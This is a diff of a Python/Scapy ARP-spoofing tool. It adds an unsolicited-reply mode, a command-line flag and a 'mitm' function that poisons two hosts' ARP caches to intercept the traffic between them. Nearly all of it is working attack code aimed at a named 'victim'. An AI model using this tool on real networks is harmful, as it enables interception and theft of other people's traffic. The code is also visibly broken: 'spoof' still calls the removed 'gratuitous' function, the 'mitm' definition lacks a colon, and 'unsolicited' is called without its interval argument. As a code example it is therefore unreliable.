@@ -10,9 +10,7 @@ import argparse
 
 from scapy.all import arpcachepoison 
 
-# TODO: add support for gratuitous response cache poisoning
-# TODO: cmd line option parsing
-def gratuitous(victim, claimed, interval):
+def unsolicited(victim, claimed, interval):
   '''
   Send gratuitous ARP replies to <victim> every <interval>,
   with <claimed> as SPA and all other fields normal
@@ -22,6 +20,9 @@ def gratuitous(victim, claimed, interval):
   a.op = 2
   a.pdst = victim
   a.psrc = claimed
+
+  # Send this packet with the given interval
+  send(a, interval)
 
 
 def spoof(victim, claimed, interval = 5, mode = 'request'):
@@ -35,12 +36,27 @@ def spoof(victim, claimed, interval = 5, mode = 'request'):
   else:
     gratuitous(victim, claimed, interval)
 
+def mitm(host1, host2, interval = 5, mode = 'request')
+  '''
+  Initiate a MITM attack between host1 and host2,
+  optionally using the gratuitous reply mode.
+  Also optionally supports different intervals.
+  '''
+
+  # This may not work due to not interleaving
+  # packets. TODO: test, switch to interleaving
+  # if necessary
+  spoof(host1, host2, interval, mode)
+  spoof(host2, host1, interval, mode)
+
 def main():
   parser = argparse.ArgumentParser(description='Send spoofed ARP packets.')
   parser.add_argument('victim', metavar='V', nargs=1,
                     help='the victim of this attack')
   parser.add_argument('claimed', metavar='C', nargs=1,
                     help='the IP to associate with the attacker MAC')
+  parser.add_argument('-u', '--unsolicited', action='store_true',
+                    help='Use unsolicited ARP replies instead of requests')
   args = parser.parse_args()
   '''
   if len(sys.argv) != 3:
@@ -52,11 +68,10 @@ def main():
   # claimed is the IP which is claimed by spoofed packets
   victim = args.victim[0]
   claimed = args.claimed[0]
-  '''
-  victim = sys.argv[1]
-  claimed = sys.argv[2]
-  '''
-  spoof(victim, claimed)
+  if args.unsolicited:
+    unsolicited(victim, claimed)
+  else:
+    spoof(victim, claimed)
 
 if __name__ == '__main__':
   main()
